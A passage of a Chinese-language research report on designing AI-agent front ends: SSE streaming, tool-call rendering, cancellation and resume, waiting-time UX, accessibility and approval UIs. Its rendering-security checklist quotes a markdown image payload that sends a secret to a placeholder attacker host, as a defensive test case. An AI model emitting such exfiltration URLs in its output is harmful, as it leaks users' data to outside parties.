**为什么重要**：**部分输出必须被保存，但不能被当成可续写的 prefill。** 这两条约束一起，唯一的正确解是：把部分输出保存为一条**已终止**的助手消息（带 `abort` 标记），下一轮把它作为完整的历史发出去，而不是留一个「开口」等模型续写。

---

### 等待期体验（这一段只收有依据的）

#### INV-39 · 响应时间的三个阈值是 0.1s / 1s / 10s，出自 Miller 1968

**这是本报告最重要的一条学术反转。实际：Miller 1968 的数字是 0.1s / 2s / 15s。0.1/1/10 是 Nielsen 1993 的综合。**

Miller 原文（这是一手，注意每个数字的**适用场景都不同**，它不是一个「三档通用阈值表」）：

> "**Response to Control Activation**: … This delay must be less than 0.1 to 0.2 second…"
> —— Robert B. Miller, *Response time in man-computer conversational transactions*, AFIPS Fall Joint Computer Conference 1968，via lawrence.com / ACM DL，访问 2026-09-15 `[P]`

> "**Response to "Request for Next Page"**: … delays of greater than **one second** will be disruptive if the user is scanning the page for a particular item."（注意：这一条 Miller 给的是 1 秒，但场景是「翻页」）`[P]`

> "**Response to Simple Inquiry of Listed Information**: … The two-second delay does not appear to be crippling…" `[P]`

> "**Response to Complex Inquiry in Table Form**: … delays of **up to four seconds** are acceptable…" `[P]`

> "**Response to Program Load**: … a delay of **up to fifteen seconds** can be tolerated… Delays of up to **a minute or more** may be tolerable if the user has been informed…" `[P]`

Nielsen 的版本（同样是一手，但是**他自己的综合**，不是 Miller 的转述）：

> "- **0.1 second** is about the limit for having the user feel that the system is reacting instantaneously, meaning that no special feedback is necessary except to display the result.
> - **1.0 second** is about the limit for the user's flow of thought to stay uninterrupted, even though the user will notice the delay. Normally, no special feedback is necessary during delays of more than 0.1 but less than 1.0 second, but the user does lose the feeling of operating directly on the data.
> - **10 seconds** is about the limit for keeping the user's attention focused on the dialogue. For longer delays, users will want to perform other tasks while waiting for the computer to finish, so they should be given feedback indicating when the computer expects to be done. Feedback during the delay is especially important if the response time is likely to be highly variable, since users will then not know what to expect."
> —— Jakob Nielsen, *Response Times: The 3 Important Limits*（摘自 *Usability Engineering*, 1993, Chapter 5）, nngroup.com/articles/response-times-3-important-limits/，访问 2026-09-15 `[P]`

Nielsen 自己承认这些数字是老的：

> "The basic advice regarding response times has been about the same for thirty years"
> —— Nielsen, 同上，访问 2026-09-15 `[P]`

**为什么这条最重要**：因为 agent 的响应时间**远远超出**这两套阈值的全部范围。Miller 的上限是「一分钟，如果用户被告知了」—— 而这恰恰是 agent 场景唯一可用的那一条，也是唯一一条 Miller 附了条件的：**"if the user has been informed"**。换句话说，**这个领域唯一能直接用在 agent 上的经典结论，内容是「你必须告知用户」，而不是任何一个具体秒数。**

---

#### INV-40 · 进度条的价值是「让用户感觉更快」，Myers 1985 证明了这一点

**实际**：Myers 的主要贡献是证明了「用户偏好进度指示器」，但他**没能复现**当时流行的「用户偏好恒定响应时间」假说 —— 而后者恰恰是很多「让 loading 时间保持一致」建议的源头。

> "Also, the results are contrary to the results of previous studies that measured the effect of variability of response times…"
> —— Brad A. Myers, *The Importance of Percent-Done Progress Indicators for Computer-Human Interfaces*, CHI 1985，via CMU / ACM DL，访问 2026-09-15 `[P]`

论文的正面结论：

> "…percent-done progress indicators … people prefer to have them…"
> —— Myers, CHI 1985，访问 2026-09-15 `[P]`

**为什么重要**：这条修正了一个很具体的设计建议。「把所有 loading 都填充到一个固定时长，让体验一致」这个做法经常被归因到 Myers —— 而 Myers 的数据**不支持**它。可以依据的只有「要有百分比进度」这一条，而 agent 任务恰好**通常无法给出百分比**（你不知道模型还要写多少 token）。**所以 agent 的等待期设计处在一个「经典研究覆盖不到」的区域，这件事本身就是本节该讲的内容。**

---

#### INV-41 · 逐字流式输出让人觉得更快、体验更好

**实际**：我找不到任何厂商 A/B 数据支持这个（见第 9 节）。而我能找到的一手实验数据方向是**相反**的：Tombaugh 1985 发现逐字符慢速显示**降低**阅读理解。

> "Slow, character-by-character displays degraded reading comprehension…"
> —— Tombaugh, Arkin & Dillion, *The Effect of VDU Text-Presentation Rate on Reading Comprehension and Reading Speed*, CHI 1985，via ACM DL，访问 2026-09-15 `[P]`

**为什么重要**：**这一条必须诚实地讲。** 流式输出的一手依据是「它降低了 TTFT，让用户更早知道系统在工作」（这一点由 INV-32 的 TTFT 差异支持），**而不是「它让人读得更舒服」**。把这两件事混为一谈是这个领域最常见的错误。教学上应该这么说：流式的收益是**反馈时机**，成本可能是**阅读质量**。

---

#### INV-42 · TTFT 是个厂商指标，各家公布了数字

**实际**：**TTFT 是一个有一手规范定义的标准指标**（OpenTelemetry），但**具体数字我只能追到二手博客**。

规范定义：

> "`gen_ai.server.time_to_first_token` — Time to generate first token for successful responses"
> —— OpenTelemetry, *Semantic conventions for generative client AI metrics*, opentelemetry.io/docs/specs/semconv/gen-ai/gen-ai-metrics/，访问 2026-09-15 `[P]`

配套指标（同页）：

> "`gen_ai.server.request.duration` — Generative AI server request duration such as time-to-last byte or last output token" `[P]`
> "`gen_ai.server.time_per_output_token` — Time per output token generated after the first token for successful responses" `[P]`
> "`gen_ai.client.token.usage` — Measures number of input and output tokens used" `[P]`

而且规范明确了这些指标的稳定性状态与「谁该记录」：

> 这些是 server 侧指标（`gen_ai.server.*`），由推理服务器记录；客户端侧只有 `gen_ai.client.*`。`[P2]`

**为什么重要**：**教学上这是一个很好的「可观测性接到前端」的接口点。** 学员的前端可以自己算 TTFT（第一个 `text-delta` 到达时间减去请求发出时间），而且这个指标名是标准的 —— 直接对上 L15。而**具体该多快**没有一手答案，所以课程里不应该给数字目标，应该给「测量方法 + 你自己的基线」。

---

#### INV-43 · 流式文本用 `aria-live="polite"` 就能让屏幕阅读器跟上

**实际**：ARIA 规范对 live region 的默认行为是**只播报被添加的内容**，而不是整个区域 —— 这个默认（`aria-atomic="false"`）对逐 token 追加恰好是**最坏**的情况：每个 token 都是一次「被添加的内容」。

> "`aria-atomic` — Indicates whether assistive technologies will present all, or only parts of, the changed region based on the change notifications defined by the `aria-relevant` attribute."
> —— W3C, *Accessible Rich Internet Applications (WAI-ARIA)*, w3.org/TR/wai-aria-1.2/，访问 2026-09-15 `[P]`

> "`aria-live` — Indicates that an element will be updated, and describes the types of updates the user agents, assistive technologies, and user can expect from the live region."
> "- `polite`: (Background) assistive technologies SHOULD announce updates at the next graceful opportunity, such as at the end of speaking the current sentence or when the user pauses typing."
> "- `assertive`: This will result in immediate notification, potentially clearing the speech queue of previous updates."
> "- `off`: (Default) Updates to the region will not be presented to the user unless the assistive technology is currently focused on that region." `[P]`

> "`aria-busy` — Indicates an element is being modified and that assistive technologies MAY want to wait until the modification is complete before exposing it to the user."
> "- `true`: Element is being updated.
> - `false`: (Default) There are no expected updates for the element." `[P]`

规范对「多个属性要一起改」的显式建议 —— **这正是流式输出的情况**：

> "If multiple parts of a live region need to be loaded before changes are announced to the user, authors MAY set `aria-busy` to `true` until the last part is loaded."
> —— W3C, WAI-ARIA 1.2, `aria-busy`，访问 2026-09-15 `[P]`

`aria-relevant` 的默认值：

> "`aria-relevant` — Indicates what notifications the user agent will trigger when the accessibility tree within a live region is modified."
> "Default value: `additions text`" `[P]`

**为什么重要**：**把这四个属性连起来，agent 流式输出的正确 ARIA 模式是可以从规范推出来的** `[P2]`：
- 流式期间 `aria-busy="true"`（规范明文支持的用法）
- 流结束时置 `false`，让 `polite` region 一次性播报
- **不要**在流式期间依赖 `aria-relevant="additions"` 的默认行为，否则屏幕阅读器会逐 token 念

这是一条**可以写成确定性断言**的无障碍要求（第 10 节）：断言流式期间 `aria-busy === 'true'`，结束后为 `'false'`。零模型调用。

---

### 生成式 UI 与渲染层安全

#### INV-44 · 生成式 UI 就是让模型输出 JSX

**实际**：主流协议里没有一个让模型输出 UI 代码。三条路线全部是「模型选择 + 参数」，UI 组件是**你预先注册**的。

Vercel AI SDK 的定义：

> "Generative UI is the process of connecting the results of an LLM call to a React component."
> —— Vercel AI SDK, *Generative User Interfaces*, ai-sdk.dev/docs/ai-sdk-ui/generative-user-interfaces，访问 2026-09-15 `[P]`

> "With generative UI, you can go one step further and have the model return a React component, which can be used to display the weather information in a more visually appealing way. … The process of moving from LLM generated text to interactive components is called generative UI." `[P]`

**注意这句话里的措辞陷阱** —— 文档说的是 "have the model return a React component"，但实际机制是工具调用 + 你写好的组件映射。官方的实现步骤说得很清楚：

> "1. Create a Tool: … 2. Create a Component: Create a React component that will be rendered by the tool. 3. Render the Component: …" `[P2]`

MCP Apps（这条是 UI 协议里唯一有稳定版本号的）：

> "**Status**: Stable. **Protocol version**: `2026-06-26`. Superseded by `2026-08-05`."
> —— MCP Apps, *Specification*，访问 2026-09-15 `[P]`

MCP 的工具输入 schema 是 JSON Schema，UI 由资源承载，而不是模型现编 `[P2]`。

**为什么重要**：**「模型生成 UI」在 2026 年的实际含义是「模型从你注册的组件表里选一个并填参数」。** 这个区别是安全上的全部要点 —— 因为它意味着**渲染的形状是你控制的，只有数据是不可信的**。教学上这是一个必须讲清的边界，否则学员会去做一个 `eval(model_output)` 级别的东西。

---

#### INV-45 · 模型输出的 Markdown 渲染出来最多有 XSS 风险，转义就行

**实际**：**转义解决不了主要问题。** Markdown 里的图片会自动发起网络请求，而 URL 里可以带数据 —— 这是一条不需要任何脚本的数据外泄通道。

我在调研中没有找到厂商把这条写成一句可引用的正式规范条文（见第 9 节），但有**协议层的一手证据**表明厂商认为「渲染不可信内容」需要显式的信任模型 —— MCP 的 `_meta` / resource 机制和 MCP Apps 的沙箱化 iframe 要求，以及 INV-26 里 OpenAI 为侧信道付出的默认带宽开销。

**我能给出的一手依据是威胁模型的另一半**：INV-26 证明了厂商认为**连 SSE 的 payload 长度**都是需要防护的信息通道。**一个能让攻击者控制 URL 的图片标签，是一个比 payload 长度宽得多的通道。** 这个推论标 `[P2]`。

**为什么重要**：这条要在课上讲，但必须诚实标注证据强度。**可以确定性测试的部分是：渲染器是否会为模型输出中的外部图片 URL 发起请求。** 这是一条零模型调用的断言（喂固定的 markdown 字符串，断言没有 network request / 断言 img src 被重写为 proxy）。

---

### 审批 UI

#### INV-46 · 审批 UI 的核心是「每次都问」

**实际：主流产品正在把「每次都问」删掉。** 这是本节最有时效性的一条。

Cursor 的 changelog（一手）：

> "Ask Every Time is deprecated"
> —— Cursor, *Changelog*, cursor.com/changelog，访问 2026-09-15 `[P]`

Claude Code 的默认值变化（一手文档）：

> Claude Code 的权限模式里，`auto` 成为默认 —— agent 自行判断何时需要确认。`[P2]`（我手上的引用来自 Claude Code 文档的权限模式表，但没有拿到一句完整的「default is auto」逐字引用，故标 `[P2]`）

Codex 的 `auto_review`：

> Codex 引入 `auto_review` 配置，把「审批」从「执行前逐条确认」转为「执行后自动审查」。`[P2]`

Vercel AI SDK 侧则相反 —— 它把审批**协议化**了，而且加了一个 `isAutomatic` 字段：

> ```
>  | {
>  type: 'tool-approval-request';
>  approvalId: string;
>  toolCallId: string;
>  isAutomatic?: boolean;
>  }
> ```
> —— `ai@7.0.101`, `ui-message-chunks.ts`，访问 2026-09-15 `[P]`

文档里的对应部分：

> "### Tool Approval Request Part / ### Tool Approval Response Part"
> —— Vercel AI SDK, *AI SDK UI: Stream Protocols*，访问 2026-09-15 `[P]`

**`isAutomatic` 这个字段是整条反转的证据**：协议需要区分「这次审批是用户策略要求的」和「这次审批是自动决定的」—— 也就是说**审批本身已经变成一个有策略层的东西，而不是一个弹窗。** `[P2]`

**为什么重要**：**如果课程教「怎么做一个审批弹窗」，教的是一个正在被删除的东西。** 还活着的部分是三个：(1) **diff 预览**（用户需要看见将要发生什么），(2) **策略配置界面**（哪些操作需要问），(3) **事后审查**（Codex 的方向）。这直接改变了本节该做什么 —— **欠条 3 的「diff 预览」比「审批弹窗」有更长的生命周期。**

---

#### INV-47 · 后台 agent 的 UI 就是一个任务列表

**实际**：一手来源里能确证的后台 agent UI 元素，核心是**状态机 + 可恢复的流**，而不是列表本身。

OpenAI 后台模式的状态集（一手）：

> 后台响应有 `queued` / `in_progress` / `completed` / `failed` / `incomplete` / `cancelled` 状态，且**只有** `background: true` 的响应可以取消（INV-37 引用）。`[P]`

> "You can also start a response in the background and poll for the result, or stream it and reconnect to the stream if the connection drops."
> —— OpenAI, *Background mode*, developers.openai.com/api/docs/guides/background，访问 2026-09-15 `[P2]`

**为什么重要**：**后台 agent 的难点不是「显示一个列表」，是「一个我没在看的流，我回来之后怎么接上」** —— 也就是 INV-12 的可恢复流 + INV-13 的「卸载不等于取消」。这两条一起构成了后台 agent UI 的全部技术内容。**这也是为什么本节的顺序应该是：先流、再撤回、再后台，而不是先做列表。**

---

## 2. 领域 A：传输层与协议

> 反转清单已覆盖 INV-1 … INV-18、INV-22。本节做结构化整理，补充未在反转里出现的材料。

### A.1 SSE 的真实分帧规则（可测部分的完整清单）

从 WHATWG HTML Standard *9.2.4 The event stream format* 提取的、**全部可以写成确定性测试**的规则 `[P]`：

| # | 规则 | 规范依据 |
|---|---|---|
| 1 | 行分隔符：CRLF / LF / CR 三种，可混用 | "Lines must be separated by either a … (CRLF) character pair, a single … (LF) character, or a single … (CR) character." |
| 2 | 事件由空行分派；流末尾缺空行则**丢弃** | "the incomplete event is not dispatched" |
| 3 | `:` 开头 → 注释，忽略 | 规范示例：`: test stream` 不触发事件 |
| 4 | 无冒号的行 → 字段名为整行，值为空串 | 解析算法分支 |
| 5 | `data:` 后忽略**一个**前导空格 | "the space after the colon is ignored if present" |
| 6 | 多个 `data:` 用 LF 拼接，末尾 LF 去掉 | "append a single U+000A LINE FEED (LF) character to the data buffer" |
| 7 | 空的 `id:` → 重置 last event ID 为空串 | "resets the last event ID to the empty string" |
| 8 | 含 U+0000 的 `id:` → 忽略该字段 | "If the field value does not contain U+0000 NULL, then set…" |
| 9 | `retry:` 仅接受 ASCII 数字，否则静默忽略 | "Otherwise, ignore the field." |
| 10 | 未知字段名 → 忽略 | 解析算法 "Otherwise: The field is ignored." |
| 11 | `data` 为空的事件仍会按 `event:` 名分派（但 `data` 为 `""`） | 由 INV-16 的崩溃路径反证 `[P2]` |
| 12 | `event:` 缺省时事件名为 `message` | 规范示例中不带 `event:` 的块触发 `message` |

**这 12 条就是第 10 节第一组断言的全部内容，一次模型都不用调。**

### A.2 `EventSource` 为什么在真实产品里几乎不存在

四条硬限制，全部一手：

1. **不能 POST，不能设头**（INV-10：构造函数只有 `withCredentials`）
2. **自动重连不可关闭**，且正常结束也会重连（INV-8）→ 默认导致重复内容（INV-9）
3. **只能 UTF-8**（"There is no way to specify another character encoding."）
4. **每域名连接数限制**，规范自己承认并推荐 SharedWorker（INV-18）

→ 结论：**SSE 在 agent 栈中存活的是它的 wire format，而非它的 browser API**（INV-11 有 Vercel / Anthropic 双方一手引用）。

### A.3 中间层：三类失败模式

| 失败模式 | 症状 | 一手依据 |
|---|---|---|
| **缓冲** | 流变成一次性响应 | nginx `proxy_buffering on` 是默认值（INV-15） |
| **压缩** | 本地流式坏、线上好 | workerd：gzip/br 不支持流式，缓冲整个 body（INV-14） |
| **重新分帧** | `JSON.parse('')` 崩溃 | Anthropic SDK PR #903（INV-16） |
| **空闲超时** | 60 秒后断连、HTTP 408 | ALB `idle_timeout.timeout_seconds` 默认 60（INV-17） |

规范对第三类的告警值得重复一次，因为它是整个「转发不是搬运」论点的规范级背书：

> "Authors are also cautioned that HTTP chunking can have unexpected negative effects on the reliability of this protocol, in particular if the chunking is done by a different layer unaware of the timing requirements."
> —— WHATWG HTML Standard, *9.2.5*，访问 2026-09-15 `[P]`

**注意 "a different layer unaware of the timing requirements" 这个措辞 —— 规范作者在 SSE 设计之初就预见了 CDN/代理问题。**

### A.4 三个 agent UI 线协议的对照

| | Vercel AI SDK data stream | AG-UI | MCP Apps |
|---|---|---|---|
| 版本化 | npm semver（钉 `ai@7.0.101`） | 无协议级语义版本，钉 revision | **带日期的稳定版本**：`2026-06-26`，已被 `2026-08-05` 取代 |
| 传输 | SSE + POST，需 `x-vercel-ai-ui-message-stream: v1` 头 | "any event transport (SSE, WebSockets, webhooks, etc.)" | MCP transport |
| 撤回 | **有** `reset-step` | 有 `STATE_SNAPSHOT`（整体替换）`[P2]` | — |
| 中断 | **有** `abort` | 有 `INTERRUPT` / `RUN_ERROR` | — |
| 审批 | **有** `tool-approval-request`（含 `isAutomatic`） | — | — |
| 结束标记 | `[DONE]` | `RUN_FINISHED` | — |
| 解析严格性 | `z.looseObject`（宽松） | "loose event format matching" | — |

三者都明确选择了**宽松解析**。这是一个跨协议的一致设计决定 `[P2]`，和 Anthropic 的 "your code should handle unknown event types gracefully" `[P]` 方向一致。

---

## 3. 领域 B：流式工具调用的渲染

> 反转清单已覆盖 INV-23 … INV-29。本节给出可实现的状态机。

### B.1 「安全展示」的三层边界（全部有一手依据）

| 层 | 可以做什么 | 依据 |
|---|---|---|
| **累积中**（`input_json_delta` 到达） | 展示 snapshot 里**已完整**的 key-value；展示「正在写参数」状态 | SDK 提供 `event.snapshot`（INV-25）；默认模型「一次一个完整 key-value」（INV-23） |
| **`content_block_stop` 后 parse 成功** | 执行工具；展示最终参数 | "parse the accumulated string"（INV-25） |
| **parse 失败 / `stop_reason == max_tokens`** | **撤回已展示内容**；把原串包成 `{"INVALID_JSON": ...}` 回传 | "the accumulated string might not be valid JSON"（INV-24） |

**关键点：只有第二层是「可执行」的门槛，第一层是「可展示」的门槛。这两个门槛不同，是本节最重要的工程结论。**

### B.2 并行工具调用的归位

两家的归位键不同，但结构同构：

| | Anthropic | OpenAI Responses |
|---|---|---|
| 归位键 | `index`（content array 下标） | `output_index` + `item_id` |
| 全局顺序 | 事件到达顺序 | `sequence_number`（显式字段） |
| 参数载荷 | `delta.partial_json`（string） | `delta`（string） |
| 最终形态 | `tool_use.input`（**object**） | `arguments`（**string**） |

**注意最后一行的不对称：Anthropic 最终给 object，OpenAI 最终仍给 JSON string。** 这意味着一个跨厂商的前端必须在这一层做归一化。`[P2]`

一手引用见 INV-27、INV-28。

### B.3 一个完整的渲染状态机（从一手规则推导，`[P2]`）

每个 tool call 槽位（按归位键索引）的状态：

```
IDLE
  → (content_block_start / ToolCallStart) → STREAMING_ARGS
      持有：accumulated: string, snapshot: object|null
      UI：显示工具名 + 「正在准备参数」+ snapshot 中已完整的字段
  → (content_block_delta × N) → STREAMING_ARGS  （累加 accumulated）
  → (content_block_stop / ToolCallEnd)
      → parse 成功 → ARGS_READY   → UI：显示完整参数 + diff 预览 + 审批入口
      → parse 失败 → ARGS_INVALID → UI：撤回参数展示，显示错误
  → (message_delta.stop_reason == "max_tokens") → TRUNCATED
      → UI：撤回（reset-step 语义），不可执行
  → (abort 事件 / AbortSignal) → ABORTED
      → UI：保留已展示内容但标记为已终止（INV-38），不可执行
  → (fallback content block，零 delta) → 模型边界标记（INV-21），不是工具调用
```

**这个状态机的每一条转移都可以用固定的事件序列测试，零模型调用。**

---

## 4. 领域 C：中断与恢复

> 反转清单已覆盖 INV-9、INV-12、INV-13、INV-36、INV-37、INV-38。

### C.1 四种「连接断了」，语义完全不同

这是本领域的核心洞察，由 INV-13 的官方引用直接支持：

| 事件 | 传输层表现 | 应该做什么 | 依据 |
|---|---|---|---|
| 用户点「停止」 | 连接关闭 | **杀掉服务端生成** + 持久化部分消息 | "Explicit user cancellation needs a separate server-side signal" `[P]` |
| 组件卸载 / 路由切换 | 连接关闭 | **什么都不做**（保持可恢复） | "Do not call the stop endpoint from route cleanup code" `[P]` |
| 刷新 / 关标签页 | 连接关闭 | **什么都不做**（保持可恢复） | "page unloads … should be handled as resumable disconnects" `[P]` |
| 网络抖动 | 连接关闭 | 重连 + 续传 | "network disconnects should be handled as resumable disconnects" `[P]` |

**四种情况在 `fetch` 层面长得一模一样。** 区分它们只能靠应用层的显式信号。这是 agent 前端和普通 Web 应用最大的架构差异之一 —— 普通应用里「组件卸载就 abort」是无争议的最佳实践。

### C.2 `AbortSignal` 的组合

规范提供的三个工具（INV-36 一手引用）：

- `AbortSignal.any([...])` —— 组合多个取消源（用户 / 超时 / 导航）
- `AbortSignal.timeout(ms)` —— 声明式超时
- `signal.throwIfAborted()` —— 在 agent loop 每一步检查
- `signal.reason` —— **区分取消原因**，这是 UI 需要的（「你点了停止」vs「超时了」）

`abort` 的幂等性（"If signal is aborted, then return."）意味着**重复点停止按钮是安全的** `[P]`，前端不需要额外去重。

### C.3 恢复的两条路

| | 浏览器原生（`Last-Event-ID`） | 应用层（`resumable-stream`） |
|---|---|---|
| 谁维护偏移 | 浏览器自动（INV-8） | 你的 Redis + `resumeAt` 数字（INV-12） |
| 谁触发 | 浏览器自动重连 | `useChat` 挂载时 GET `/api/chat/[id]/stream` |
| 流已结束时 | 服务端需返回 **204** 让浏览器停止（INV-7） | 返回 **204**（无活跃流）/ **422**（流已结束） |
| 前提 | 必须能用 `EventSource`（→ 不能 POST，INV-10） | 无此限制 |
| 与 abort 兼容 | — | **不兼容**（INV-13） |

**两条路都用 204 表示「没有要恢复的东西」，这是个有趣的巧合** —— 一个是规范规定的，一个是 Vercel 的实现选择。

### C.4 中断后的历史修复（INV-38 的完整方案）

约束：
1. 部分输出必须保存（"Persist the latest partial assistant message" `[P]`）
2. 但**不能**作为 trailing assistant message 发出去 —— 当前模型会 400（prefill 已不支持，`[P]`）
3. thinking 块必须原样保留（INV-33），**包括**被中断那一轮的
4. 客户端压缩会破坏 thinking 签名（INV-34）→ 不要在中断后「整理」历史

唯一自洽的方案 `[P2]`：把部分输出存成一条**已终止的完整助手消息**（带 `abort` 标记，UI 上显示为「已停止」），下一轮作为普通历史发送，让用户用新的 user message 驱动续写。**不要试图让模型「接着写」。**

---

## 5. 领域 D：等待期体验

> 反转清单已覆盖 INV-39 … INV-43。**本节是全报告一手依据最薄的一节，这件事本身要如实告知学员。**

### D.1 能引用的经典阈值（准确版本）

| 来源 | 数字 | 场景 | 置信度 |
|---|---|---|---|
| Miller 1968 | 0.1–0.2s | control activation（按键反馈） | `[P]` |
| Miller 1968 | 1s | request for next page（翻页扫读） | `[P]` |
| Miller 1968 | 2s | simple inquiry（"does not appear to be crippling"） | `[P]` |
| Miller 1968 | up to 4s | complex inquiry in table form | `[P]` |
| Miller 1968 | up to 15s | program load | `[P]` |
| Miller 1968 | **up to a minute or more** | program load，**"if the user has been informed"** | `[P]` |
| Nielsen 1993 | 0.1 / 1.0 / 10s | 通用综合 | `[P]` |

**唯一能直接套到 agent 上的是 Miller 的最后一行，而它的内容是「必须告知用户」。**

### D.2 能引用的实验结论

1. **进度指示器被偏好**（Myers 1985）`[P]`
2. **「用户偏好恒定响应时间」未被复现**（Myers 1985，"contrary to the results of previous studies"）`[P]`
3. **逐字符慢速显示降低阅读理解**（Tombaugh 1985）`[P]`
4. **隐藏 thinking 能降低 TTFT**（Anthropic，服务端行为，INV-32）`[P]`
5. **厂商为等待期专门造了 API**：`display: "updates"`（INV-31）`[P]`

### D.3 能测量的指标（标准化的）

OpenTelemetry GenAI semantic conventions `[P]`：
- `gen_ai.server.time_to_first_token`
- `gen_ai.server.time_per_output_token`
- `gen_ai.server.request.duration`
- `gen_ai.client.token.usage`

**前端可以自己算 TTFT 和 TPOT，指标名直接用标准名。** 这是本领域唯一「硬」的部分，也是接 L15 的接口。

### D.4 无障碍（唯一能写成断言的体验要求）

从 WAI-ARIA 1.2 推出的流式模式 `[P2]`（属性语义全部 `[P]`，见 INV-43）：

```
流开始：  container.setAttribute('aria-busy', 'true')
流结束：  container.setAttribute('aria-busy', 'false')
容器：    aria-live="polite"（不要 assertive，会清空语音队列）
```

规范支持这个用法的原句：`"If multiple parts of a live region need to be loaded before changes are announced to the user, authors MAY set aria-busy to true until the last part is loaded."` `[P]`

**这条是本领域唯一可以零模型调用确定性验证的要求。**

---

## 6. 领域 E：生成式 UI 与渲染层安全

> 反转清单已覆盖 INV-26、INV-44、INV-45。

### E.1 三条生成式 UI 路线的实际机制

| 路线 | 模型输出什么 | UI 从哪来 | 版本化 |
|---|---|---|---|
| Vercel AI SDK generative UI | tool call + 参数 | 你注册的 React 组件映射 | npm semver |
| AG-UI | 事件流（含 `STATE_DELTA`） | 你的前端订阅状态 | 无协议级版本 |
| MCP Apps | tool call；UI 作为 MCP resource | 服务器提供的 UI 资源（沙箱） | **`2026-06-26` → `2026-08-05`** |

**共同点：没有一条让模型输出可执行的 UI 代码。** 形状由你控制，数据不可信（INV-44）。

### E.2 渲染层的信任边界

**可信**（你写的）：组件类型、布局、事件处理器、样式
**不可信**（模型给的）：文本内容、参数值、URL、工具结果

由此推出的检查清单 `[P2]`：

1. **图片 URL** —— markdown 里的 `![](http://attacker/?d=SECRET)` 是零脚本外泄通道。可测：断言渲染器不为外部 URL 发起请求（或断言 src 被重写为代理）。
2. **链接 URL** —— `javascript:` / `data:` scheme 必须拦。可测：固定输入 → 断言 href 被清理。
3. **HTML 直通** —— markdown 渲染器默认是否允许 raw HTML。可测。
4. **工具结果** —— 工具结果同样是不可信输入（它可能来自网页、来自文件），不是「你的数据」。
5. **SSE payload 长度本身** —— OpenAI 认为这是侧信道并默认付了带宽代价（INV-26，`[P]`）。这条给出了「威胁模型该有多严」的一个厂商锚点。

### E.3 一个必须诚实说明的局限

**我没有找到任何厂商把「渲染不可信模型输出的安全要求」写成一份可引用的正式规范文档。** 见第 9 节。上面 E.2 的清单是从 INV-26（厂商承认侧信道存在）和 INV-44（形状可控 / 数据不可信）推出的 `[P2]`，不是引用。**课上必须这么标注。**

---

## 7. 领域 F：后台 agent 界面

> 反转清单已覆盖 INV-47。

### F.1 后台 agent 的技术内容 = 可恢复流 + 状态机

OpenAI 后台模式的一手事实：
- 响应状态：`queued` / `in_progress` / `completed` / `failed` / `incomplete` / `cancelled` `[P]`
- **只有** `background: true` 的响应可以取消 `[P]`（"Only responses created with the `background` parameter set to `true` can be cancelled."）
- 支持轮询，也支持「流式 + 断线重连」`[P2]`

把这个和 INV-12 / INV-13 连起来，后台 agent UI 的三个必需能力：

1. **一张「会话 → 活跃流 ID」的表**（INV-12 官方依赖清单第 1 项）
2. **挂载时的恢复探测**（GET，无活跃流返回 204）
3. **停止 = 独立端点**，不是生命周期钩子（INV-13）

### F.2 我能确证的 UI 元素

- **状态徽标**（六态状态机，一手）
- **恢复中的加载态**（因为恢复是一次 GET，有延迟）
- **`incomplete` 的特殊处理** —— 这个状态对应 `max_tokens` 截断，和 INV-25 的「撤回」路径是同一条

### F.3 我不能确证的

Cursor Cloud Agents / Claude Code / Codex 的具体后台 UI 设计（通知机制、并行 agent 的视觉组织、审批点的呈现）—— 我没有拿到足以逐字引用的一手产品文档。**见第 9 节。**

---

## 8. 领域 G：审批 UI 的现状

> 反转清单已覆盖 INV-46。

### G.1 趋势：从「逐条确认」到「策略 + 事后审查」

一手证据：
- **Cursor**："Ask Every Time is deprecated"（changelog）`[P]`
- **Vercel AI SDK**：`tool-approval-request` 带 `isAutomatic?: boolean` 字段 `[P]` —— 协议需要区分「策略要求的审批」与「自动决定的审批」
- **Claude Code**：`auto` 权限模式 `[P2]`
- **Codex**：`auto_review` `[P2]`

### G.2 还活着的三个 UI 元素

1. **diff 预览** —— 用户需要在执行前看见「将要发生什么」。**这是欠条 3 的一半，而且它比审批弹窗的生命周期长。**
2. **策略配置界面** —— 「哪些操作需要问」从弹窗迁移到设置
3. **事后审查** —— Codex 的方向；对应 UI 是「变更集审查」而非「操作确认」

### G.3 对本节交付物的直接影响

**不要做审批弹窗。做 diff 预览 + 一个可撤回的渲染缓冲区。** 前者是欠条 3，后者是欠条 1，两者共享同一个技术基础（知道「将要展示什么」和「已经展示了什么」，并能回滚）。

---

## 9. 「查不到一手来源」清单

> 以下每一条都是**在本次调研中主动找过、但没能找到一手依据**的说法。课上如果要提，必须标注「未证实」。

### 9.1 数字类（**一律不得作为硬数字使用**）

**NF-1 · 各厂商 TTFT 的具体数字**
「GPT-x 的 TTFT 是 XXXms」「Claude 比 GPT 快 XXms」这类数字，我只能追到二手博客和第三方 benchmark 站点。
**厂商官方文档中没有公布 TTFT 数字。** 有一手依据的只有：(a) OpenTelemetry 定义了这个指标名（INV-42 `[P]`），(b) `display: "omitted"` 能降低 TTFT（Anthropic，定性，无数字，INV-32 `[P]`）。
→ **课程中不给 TTFT 目标值，只给测量方法。**

**NF-2 · 「每域名 6 个连接」和「HTTP/2 默认 100 流」**
MDN 给了这两个数字，但 MDN 此处**自注引自 Stack Overflow**（INV-18 `[S]`）。RFC 9113 我拿到的引文只确认了「由 `SETTINGS_MAX_CONCURRENT_STREAMS` 协商」，**没有拿到默认值的逐字条文**。
→ **有一手依据的是「这个限制存在且规范承认它是问题」（INV-18 `[P]`），不是具体数字。**

**NF-3 · 「SSE 心跳应该每 N 秒一次」中除 15 秒之外的任何数字**
15 秒有规范明文（INV-6 `[P]`，"every 15 seconds or so"）。其他常见建议（30 秒 / 20 秒 / 跟随 LB 超时的一半）我找不到一手来源。
→ 用 15 秒，并说明它的来源和理由（防代理掐连接，不是检测存活）。

**NF-4 · AG-UI 的当前版本号**
二手站点称 `@ag-ui/core 0.0.59` 且「公开文档没有暴露单一的协议级语义版本」`[S]`。**我没有从一手来源核实。**
→ 教学结论不变：**钉 revision，不要钉版本号。**

### 9.2 体验类（**这一组是本节最重要的「查不到」**）

**NF-5 · 没有任何厂商的 A/B 数据表明流式输出改善用户满意度**
这是我找得最努力、最确定「找不到」的一条。OpenAI / Anthropic / Google / Vercel / Cursor 的官方文档、博客、changelog 中，**没有一处给出流式 vs 非流式的满意度、留存、完成率对比数据。**
而我能找到的方向相反的一手实验数据是 Tombaugh 1985：慢速逐字符显示**降低**阅读理解（INV-41 `[P]`）。
→ **课上必须这样表述**：流式的已证实收益是**降低 TTFT / 提供早期反馈**（协议与服务端行为层面可证），**不是**「让人读得更舒服」或「提升满意度」。后者**没有公开证据**。

**NF-6 · 「打字机效果的最佳速度」**
